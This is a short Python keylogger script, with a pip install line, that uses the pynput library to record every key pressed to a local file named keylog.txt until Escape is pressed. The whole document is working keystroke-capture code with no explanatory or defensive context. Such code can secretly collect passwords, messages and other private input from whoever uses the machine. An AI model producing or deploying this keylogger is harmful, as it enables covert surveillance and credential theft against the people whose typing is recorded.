pip install pynput

from pynput import keyboard

# File where the logs will be saved
log_file = "keylog.txt"

def on_press(key):
    try:
        # Try to get the character
        current_key = key.char
    except AttributeError:
        # If the character is not a printable character, get the name of the key
        current_key = str(key)

    # Save the keystroke to the log file
    with open(log_file, "a") as f:
        f.write(current_key + "\n")

def on_release(key):
    # Stop listener when escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
